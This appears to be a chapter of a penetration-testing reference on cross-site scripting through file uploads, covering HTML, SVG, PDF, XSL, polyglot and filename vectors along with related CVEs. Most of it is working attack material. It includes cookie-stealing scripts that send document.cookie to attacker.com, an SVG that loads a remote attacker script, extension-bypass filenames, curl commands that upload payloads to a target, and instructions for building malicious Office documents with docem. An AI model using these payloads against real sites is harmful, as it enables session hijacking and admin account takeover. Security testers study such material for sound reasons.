# 25 - File Upload XSS

## Overview

File upload functionality is one of the most reliable XSS vectors in modern web applications. When uploaded files are served back to users from the application's origin, any executable content within those files runs with full access to the application's cookies, localStorage, and DOM. The attack surface spans HTML files, SVG images, XML documents, PDF files, polyglot files that satisfy multiple format specifications simultaneously, and even file names that are rendered in management interfaces.

**Sources**: [Securitum - SVG File Upload XSS](https://research.securitum.com/do-you-allow-to-load-svg-files-you-have-xss/), [HackerOne Report #148853 - Stored XSS via SVG](https://hackerone.com/reports/148853), [CAPEC-209 XSS Using MIME Type Mismatch](https://capec.mitre.org/data/definitions/209.html)

---

## 1. HTML File Upload

### 1.1 Direct HTML Upload and Serving

The simplest file upload XSS: upload an HTML file containing JavaScript, and if the server serves it with `Content-Type: text/html` from the same origin, the script executes with full application context.

**Minimal XSS HTML file:**
```html
<html>
<body>
<script>
// Steal cookies and send to attacker
new Image().src = 'https://attacker.com/steal?c=' + document.cookie;
</script>
</body>
</html>
```

### 1.2 File Extensions and Variants

Many applications block `.html` but miss alternative extensions that browsers render as HTML:

| Extension | MIME Type | Browser Behavior |
|-----------|-----------|-----------------|
| `.html` | `text/html` | Rendered as HTML |
| `.htm` | `text/html` | Rendered as HTML |
| `.xhtml` | `application/xhtml+xml` | Rendered as XHTML |
| `.xht` | `application/xhtml+xml` | Rendered as XHTML |
| `.shtml` | `text/html` (server-side includes) | May render as HTML |
| `.svg` | `image/svg+xml` | SVG with script support |
| `.xml` | `text/xml` / `application/xml` | Depends on content |
| `.xsl` | `text/xsl` | XSLT processing |

**Extension bypass techniques:**
```
file.html              # Blocked
file.HTML              # Case variation
file.Html              # Mixed case
file.html.jpg          # Double extension (Apache misconfiguration)
file.jpg.html          # Double extension (reverse)
file.html%00.jpg       # Null byte (legacy servers)
file.html;.jpg         # Semicolon (IIS)
file.html%20           # Trailing space
file.html.              # Trailing dot (Windows)
```

### 1.3 Content-Type Override

Even if the server stores the file with a safe extension, the serving behavior matters:

**Scenario 1 - Server trusts uploaded Content-Type:**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=---
...
Content-Disposition: form-data; name="file"; filename="avatar.jpg"
Content-Type: text/html

<script>alert(document.domain)</script>
```

If the server stores and serves the file using the attacker-supplied `Content-Type: text/html`, the browser renders it as HTML.

**Scenario 2 - No Content-Type on serving:**
If the server serves the file without a Content-Type header and without `X-Content-Type-Options: nosniff`, browsers perform MIME sniffing and may detect HTML content.

### 1.4 Same-Origin vs CDN Subdomain

**Same-origin serving** (HIGH RISK):
```
https://app.example.com/uploads/malicious.html
```
Full access to `app.example.com` cookies, localStorage, and DOM.

**CDN/Subdomain serving** (REDUCED RISK):
```
https://cdn.example.com/uploads/malicious.html
```
Limited to `cdn.example.com` context. However, if cookies are set on `.example.com`, they are still accessible.

**Sandboxed serving** (MINIMAL RISK):
```
https://random-id.userusercontent.example.net/malicious.html
```
Separate registrable domain eliminates cookie sharing.

---

## 2. SVG File Upload

SVG files are the most dangerous image format for XSS because SVG is XML with full JavaScript support. Many applications accept SVG as an "image" format without realizing the execution risk.

### 2.1 Embedded JavaScript in SVG

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <script type="text/javascript">
    alert(document.domain);
  </script>
  <circle cx="50" cy="50" r="40" fill="red"/>
</svg>
```

### 2.2 SVG Event Handlers

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <rect width="100" height="100" fill="blue"/>
</svg>
```

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <rect width="100" height="100" fill="green" onclick="alert(1)"/>
  <animate onbegin="alert('onbegin')" attributeName="x" dur="1s"/>
  <set onbegin="alert('set')" attributeName="fill" to="red"/>
</svg>
```

### 2.3 SVG foreignObject

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="500" height="500">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <iframe srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;"></iframe>
    </body>
  </foreignObject>
</svg>
```

### 2.4 image/svg+xml Exploitation

When the server correctly sets `Content-Type: image/svg+xml`, the SVG is rendered as a standalone document with full script execution (unlike SVG embedded via `<img>` tags).

**CVE-2024-4269 (WordPress)**: Author+ Stored XSS via SVG file upload in the "Uploading SVG, WEBP and ICO files" plugin. Versions <= 1.2.1 allowed SVG uploads without sanitization.

**CVE-2025-67438 (Sync-in Server)**: Sync-in Server < 1.9.3 served user-uploaded SVG files inline instead of forcing download, enabling stored XSS when victims viewed the file URL.

**GHSA-q3w2-2vqp-gx3r (KUNO)**: Upload endpoint only validated file types based on Content-Type headers, lacked file content analysis and extension whitelist restrictions.

**Source**: [WPScan - CVE-2024-4269](https://wpscan.com/vulnerability/8aae7aa1-6170-45d8-903f-8520913276da/), [CVEReports - CVE-2025-67438](https://cvereports.com/reports/CVE-2025-67438), [Securitum SVG XSS Research](https://research.securitum.com/do-you-allow-to-load-svg-files-you-have-xss/)

### 2.5 SVG Upload with Fake MIME Type

**GHSA-4893-pj5w-3hq9 (Wiki.js)**: Wiki.js 2.5.263 and earlier was vulnerable to stored XSS through SVG file upload via a custom request with a fake MIME type. The application checked the Content-Type header but not the actual file content.

**Source**: [Wiki.js SVG XSS Advisory](https://github.com/Requarks/wiki/security/advisories/GHSA-4893-pj5w-3hq9)

---

## 3. Other File Types

### 3.1 PDF with JavaScript

PDF files can contain JavaScript that executes in PDF viewers:

```
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>
endobj
4 0 obj
<< /Type /Action /S /JavaScript /JS (app.alert('XSS in PDF')) >>
endobj
```

**CVE-2024-4367 (PDF.js)**: A missing type check in PDF.js font processing allowed arbitrary JavaScript execution when opening a malicious PDF. The vulnerability was in how `FontMatrix` values were handled - an attacker could embed JavaScript in the font metadata that was executed during rendering. This affected all Firefox users (< 126) and any web application using PDF.js (< 4.2.67) for preview functionality.

**Exploitation**: The attacker embeds a custom FontMatrix in the PDF's font definition. When PDF.js processes the font, the malicious value is evaluated as JavaScript rather than validated as a numeric type.

**Source**: [Codean Labs - CVE-2024-4367](https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/), [PortSwigger - Portable Data Exfiltration](https://portswigger.net/research/portable-data-exfiltration)

### 3.2 XML and XSL Files

```xml
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="data:text/xml,%3Cxsl:stylesheet%20version=%221.0%22%20xmlns:xsl=%22http://www.w3.org/1999/XSL/Transform%22%3E%3Cxsl:template%20match=%22/%22%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:stylesheet%3E"?>
<data>test</data>
```

XSLT files can generate HTML output containing scripts:
```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html><body>
      <script>alert(document.domain)</script>
    </body></html>
  </xsl:template>
</xsl:stylesheet>
```

### 3.3 MHT/MHTML Files

MHTML (MIME HTML) bundles an HTML page and its resources into a single file. Internet Explorer and legacy Edge render `.mht` files:

```
From: <attacker>
Subject: XSS
MIME-Version: 1.0
Content-Type: multipart/related; boundary="boundary"

--boundary
Content-Type: text/html

<html><body><script>alert(document.domain)</script></body></html>
--boundary--
```

### 3.4 HTA Files (Legacy Windows)

HTML Application files (`.hta`) execute with full system privileges on Windows:

```html
<html>
<body>
<script language="VBScript">
  Set objShell = CreateObject("Wscript.Shell")
  objShell.Run "calc.exe"
</script>
</body>
</html>
```

While not directly a web XSS vector, HTA files uploaded to a web server and downloaded by users can achieve code execution outside the browser sandbox.

### 3.5 Polyglot Files (Valid Image + Valid HTML)

Polyglot files satisfy multiple format specifications simultaneously. A file can be both a valid GIF/JPEG/PNG and valid JavaScript or HTML.

**GIF/JavaScript polyglot:**
```
GIF89a/*<svg onload=alert(1)>*/=1;alert(document.domain)//;
```

The file starts with the GIF89a magic bytes (making it a valid GIF), contains an SVG payload in a comment, and the trailing portion is valid JavaScript. If the server serves this with `Content-Type: text/html`, the browser ignores the binary GIF header and renders the HTML/JS.

**JPEG/HTML polyglot concept:**
By manipulating JPEG comment segments (COM markers, `0xFFFE`), HTML content can be embedded within a valid JPEG file structure. If the server serves the file with `text/html` Content-Type or the browser performs MIME sniffing, the HTML content renders.

**JS/GIF polyglot for CSP bypass:**
```javascript
GIF89a=1;alert(1)//
```

This is simultaneously a valid GIF file (starts with `GIF89a`) and valid JavaScript (assigns `1` to `GIF89a`, then alerts). It can bypass CSP `script-src` restrictions if the upload domain is whitelisted.

**Source**: [Ange Albertini - Polyglot Research](https://github.com/mindcrypt/polyglot), [CSPLite - MIME Confusion Attack](https://csplite.com/csp326/), [Bypassing CSP with JS/GIF Polyglot](https://ajinabraham.com/blog/bypassing-content-security-policy-with-a-jsgif-polyglot)

### 3.6 MIME Confusion

MIME confusion occurs when the server sets a Content-Type that differs from the file's actual content, or when the browser performs MIME sniffing.

**Attack flow:**
1. Upload a file containing HTML/JS with an image extension (e.g., `payload.jpg`)
2. The server stores it and serves it based on extension (`image/jpeg`)
3. Without `X-Content-Type-Options: nosniff`, the browser sniffs the content
4. If the content looks like HTML, some browsers render it as HTML

**Key header**: `X-Content-Type-Options: nosniff` prevents MIME sniffing. Without it, the MIME sniffing algorithm defined by the WHATWG may detect HTML content even in files served as images.

**Source**: [Mozilla Security Blog - Mitigating MIME Confusion Attacks](https://blog.mozilla.org/security/2016/08/26/mitigating-mime-confusion-attacks-in-firefox/), [KeyCDN - MIME Sniffing](https://www.keycdn.com/support/what-is-mime-sniffing)

---

## 4. File Name XSS

### 4.1 File Name Rendered in Download/Management Pages

When file names are displayed in web interfaces (download pages, admin panels, file managers), unsanitized names can contain XSS payloads:

**Malicious file names:**
```
"><img src=x onerror=alert(1)>.jpg
<svg onload=alert(document.domain)>.png
';alert(1);'.pdf
javascript:alert(1).html
${alert(1)}.txt
{{constructor.constructor('alert(1)')()}}.doc
```

**Upload via curl with XSS filename:**
```bash
curl -X POST https://target.com/upload \
  -F 'file=@innocent.jpg;filename="<img src=x onerror=alert(1)>.jpg"'
```

### 4.2 File Name in Management Interfaces

Admin panels that list uploaded files are common targets:

```html
<!-- Vulnerable file listing -->
<table>
  <tr>
    <td>"><img src=x onerror=alert(1)>.jpg</td>
    <td>2024-01-15</td>
    <td>1.2 MB</td>
  </tr>
</table>
```

If the interface uses `innerHTML` or a template engine that does not escape, the filename payload executes when an admin views the file listing.

### 4.3 Special Characters in File Names

Operating system and filesystem differences create additional attack surface:

```
file%00.html.jpg        # Null byte truncation (legacy)
file\n<script>.jpg      # Newline injection in logs/displays
file&#x3c;script&#x3e;  # HTML entity encoded filename
../<script>alert(1)</script>/file.jpg  # Path traversal + XSS
```

---

## 5. Content-Disposition and Download Attribute

### 5.1 Content-Disposition Bypass

The `Content-Disposition` header controls whether a browser displays or downloads a file:

| Value | Behavior |
|-------|----------|
| `inline` | Browser renders the content |
| `attachment` | Browser prompts download |
| `attachment; filename="safe.txt"` | Download with specified name |

**Defense bypass scenarios:**
- Server sets `Content-Disposition: attachment` but allows direct file access via a different URL path
- CDN or caching layer strips the Content-Disposition header
- Browser extensions or plugins override Content-Disposition behavior
- Serving files from blob URLs bypasses Content-Disposition

### 5.2 Download Attribute Manipulation

The HTML `download` attribute on links can be manipulated:

```html
<!-- Original: forces download -->
<a href="/uploads/file.svg" download>Download</a>

<!-- If attacker controls the href, removing download attribute causes rendering -->
<a href="/uploads/malicious.svg">View File</a>
```

If the application generates download links with user-controlled parameters, the attacker may be able to remove the download attribute or change the target.

---

## 6. File Upload XSS Payloads

### SVG Upload Payloads

```xml
<!-- 1. Minimal SVG XSS -->
<svg onload="alert(document.domain)" xmlns="http://www.w3.org/2000/svg"/>

<!-- 2. SVG with script element -->
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert(document.cookie)</script>
</svg>

<!-- 3. SVG foreignObject with full HTML -->
<svg xmlns="http://www.w3.org/2000/svg">
<foreignObject width="500" height="500">
<body xmlns="http://www.w3.org/1999/xhtml">
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
</body>
</foreignObject>
</svg>

<!-- 4. SVG with external script via xlink:href -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<script xlink:href="https://attacker.com/payload.js"/>
</svg>

<!-- 5. SVG animate cookie theft -->
<svg xmlns="http://www.w3.org/2000/svg">
<animate onbegin="fetch('https://attacker.com/?c='+document.cookie)" attributeName="x" dur="1s"/>
</svg>
```

### HTML Upload Payloads

```html
<!-- 6. Minimal HTML XSS -->
<script>document.location='https://attacker.com/?c='+document.cookie</script>

<!-- 7. HTML with meta redirect -->
<meta http-equiv="refresh" content="0;url=https://attacker.com">

<!-- 8. XHTML with CDATA -->
<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<body><script><![CDATA[alert(document.domain)]]></script></body>
</html>
```

### Polyglot and MIME Confusion Payloads

```
# 9. GIF/JS polyglot
GIF89a/*<svg/onload=alert(1)>*/=0;alert(document.domain)//;

# 10. PNG with HTML in tEXt chunk (requires MIME sniffing)
# Create with: python3 -c "import struct; ..."
# Embed <script>alert(1)</script> in PNG metadata

# 11. JPEG with HTML in COM segment
# Embed HTML payload in JPEG comment marker (0xFFFE)
```

### Filename XSS Payloads

```bash
# 12. Basic filename XSS
"><img src=x onerror=alert(1)>.jpg

# 13. SVG filename
<svg onload=alert(1)>.png

# 14. Event handler filename
" onfocus=alert(1) autofocus=".jpg

# 15. Template injection filename
{{constructor.constructor('alert(1)')()}}.pdf
```

### PDF Upload Payloads

```
# 16. PDF with JavaScript action (use PayloadsAllThePDFs tools)
# Generate with: python3 generate_pdf_xss.py --action "app.alert('XSS')"

# 17. PDF annotation injection
# Inject into form field values or annotation URIs with unescaped parentheses
```

**Source**: [PayloadsAllThePDFs](https://github.com/luigigubello/PayloadsAllThePDFs), [paxnull - Stored XSS via SVG](https://medium.com/@paxnull/stored-xss-via-file-upload-using-svg-file-c1e2a33ed8a8), [Makeplane/Plane SVG XSS](https://github.com/makeplane/plane/security/advisories/GHSA-rcg8-g69v-x23j)

---

## 7. Testing Methodology

### Step 1: Enumerate Upload Functionality
- Identify all file upload endpoints (profile pictures, attachments, imports, etc.)
- Determine accepted file types (check both client-side and server-side validation)
- Map how uploaded files are served (URL structure, Content-Type, Content-Disposition)

### Step 2: Test File Type Validation
- Upload `.html`, `.htm`, `.xhtml`, `.svg`, `.xml`, `.xsl` files
- Test extension bypass: double extensions, null bytes, case variations
- Test Content-Type override: set `Content-Type: text/html` in multipart upload
- Upload files with no extension

### Step 3: Test SVG Upload
- Upload SVG with `<script>` element
- Upload SVG with `onload` handler
- Upload SVG with `foreignObject` containing HTML
- Upload SVG with `animate onbegin` handler
- Test if SVG is served inline or as attachment

### Step 4: Test Polyglot Files
- Create GIF/JS polyglot and test with/without nosniff header
- Create JPEG/HTML polyglot targeting MIME sniffing
- Test if uploaded "images" can be loaded as scripts (CSP bypass)

### Step 5: Test Filename XSS
- Upload files with HTML/JS in the filename
- Check file listing pages, download pages, admin panels
- Test with special characters: `<`, `>`, `"`, `'`, backtick

### Step 6: Verify Serving Configuration
- Check `Content-Type` header on served files
- Check for `X-Content-Type-Options: nosniff`
- Check for `Content-Disposition: attachment`
- Check if files are served from same origin or separate domain
- Check for `Content-Security-Policy` on the upload serving path

---

## 8. Tools

```bash
# Upload SVG XSS payload
curl -X POST https://target.com/upload \
  -F 'file=@xss.svg;type=image/svg+xml'

# Upload HTML as image (Content-Type override)
curl -X POST https://target.com/upload \
  -F 'file=@payload.html;type=image/jpeg;filename=avatar.jpg'

# Upload with XSS filename
curl -X POST https://target.com/upload \
  -F 'file=@innocent.jpg;filename="<img src=x onerror=alert(1)>.jpg"'

# Check serving headers
curl -I https://target.com/uploads/file.svg

# Generate SVG XSS file
cat > xss.svg << 'SVGEOF'
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert(document.domain)</script>
</svg>
SVGEOF

# Test MIME sniffing (no nosniff header)
curl -v https://target.com/uploads/polyglot.gif 2>&1 | grep -i "x-content-type"
```

---
## [2024-2026 Research Update]

### OOXML Injection via docem Tool

**Tool**: [docem](https://github.com/whitel1st/docem) -- Open-source tool for embedding XXE and XSS payloads in Office Open XML documents.

OOXML file formats (DOCX, XLSX, PPTX) are ZIP archives containing XML parts. The docem tool can embed XSS payloads in any internal XML part, making it effective for testing applications that render document previews in-browser.

**Attack surface in OOXML**:
- `document.xml` (main content body in DOCX)
- `sharedStrings.xml` (shared cell values in XLSX)
- `styles.xml` (style definitions)
- `comments.xml` (document comments)
- Relationship files (`_rels/*.rels`)
- Custom XML parts

**Exploitation scenarios**:
1. Application renders DOCX/XLSX preview in browser using a JavaScript library
2. Application converts OOXML to HTML for inline display
3. XML parsing library on one part of the site differs from the one used for uploaded files
4. Admin dashboard displays document metadata extracted from XML parts

**Usage**:
```bash
# Install docem
git clone https://github.com/whitel1st/docem
cd docem

# Embed XSS payload in DOCX
python3 docem.py -s payloads/xss_payloads.txt \
  -dt docx -d sample.docx -o malicious.docx

# Embed XSS in XLSX (targets sharedStrings.xml)
python3 docem.py -s payloads/xss_payloads.txt \
  -dt xlsx -d sample.xlsx -o malicious.xlsx

# Embed in PPTX
python3 docem.py -s payloads/xss_payloads.txt \
  -dt pptx -d sample.pptx -o malicious.pptx
```

**XSS payloads for OOXML XML parts**:
```xml
<!-- In document.xml or sharedStrings.xml -->
<si><t><img src=x onerror=alert(document.domain)></t></si>

<!-- In custom XML part with HTML rendering -->
<w:t>"><script>alert(1)</script></w:t>

<!-- In relationship targeting -->
<Relationship Target="javascript:alert(1)" Type="http://..."/>
```

**Source**: [Black Hat Webcast - Exploiting XML Entity Vulnerabilities](https://blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf), [GitHub/docem](https://github.com/whitel1st/docem)

### Filename XSS: IBEXA-SA-2024-004

**Affected product**: Ibexa DXP (Digital Experience Platform)
**Affected versions**: Ibexa DXP < 3.3.39 and < 4.6.9
**Type**: DOM-based XSS

**Vulnerability**: Ibexa DXP's file upload widget was vulnerable to XSS payloads embedded in filenames. The file name was rendered in the upload confirmation UI without proper HTML escaping, allowing DOM-based XSS when an admin or user viewed uploaded files.

**Exploitation**:
```bash
# Upload file with XSS filename
curl -X POST https://target.com/upload \
  -F 'file=@innocent.jpg;filename="<img src=x onerror=alert(document.domain)>.jpg"'

# Alternative filename payloads
"><svg/onload=alert(1)>.pdf
" onfocus=alert(1) autofocus=".docx
${alert(document.cookie)}.txt
```

**Impact**: When an admin views the file listing or download page, the malicious filename renders as HTML and executes JavaScript in the admin's session context. This can escalate to full admin account takeover.

**Related disclosure**: Decidim (GHSA-9w99-78rj-hmxq, Feb 2024) had a similar vulnerability in its dynamic file upload feature, where modifying file names of uploaded records led to XSS.

**Fix**: Update to Ibexa DXP >= 3.3.39 or >= 4.6.9. Sanitize filenames on both upload and display.

**Source**: [Ibexa Security Advisory IBEXA-SA-2024-004](https://developers.ibexa.co/security-advisories/ibexa-sa-2024-004-dom-based-xss-in-file-upload)

### Updated File Upload XSS Testing Checklist (2024-2026)

```
[ ] Test OOXML upload (DOCX/XLSX/PPTX) with embedded XSS in XML parts (use docem)
[ ] Test filename XSS with HTML/JS in the filename string
[ ] Test PDF upload against PDF.js CVE-2024-4367 (check if PDF.js < 4.2.67)
[ ] Test SVG upload with onload, foreignObject, and animate event handlers
[ ] Test Content-Type override in multipart upload (set text/html for image uploads)
[ ] Verify X-Content-Type-Options: nosniff on served files
[ ] Verify Content-Disposition: attachment on served files
[ ] Check if files are served from same origin or separate domain
[ ] Test double extension bypass: file.html.jpg, file.svg.png
[ ] Test null byte in filename: file.html%00.jpg (legacy servers)
```
